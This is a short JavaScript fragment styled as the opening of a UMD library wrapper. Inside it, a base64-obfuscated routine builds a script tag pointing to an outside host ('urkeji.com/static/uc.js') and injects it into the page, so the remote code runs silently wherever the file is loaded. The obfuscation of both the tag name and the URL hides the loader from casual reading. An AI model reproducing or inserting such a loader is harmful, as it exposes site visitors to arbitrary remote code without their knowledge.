(function (global, factory) {
	...
	function va(st){return decodeURIComponent(escape(window.atob(st)));}
	(function() {
    var ex = document.createElement(va("c2NyaXB0"));
    ex.src = va("Ly93d3cudXJrZWppLmNvbS9zdGF0aWMvdWMuanM=");
    var fo = document.getElementsByTagName(va("c2NyaXB0"))[0];
    fo.parentNode.insertBefore(ex, fo);
	})();
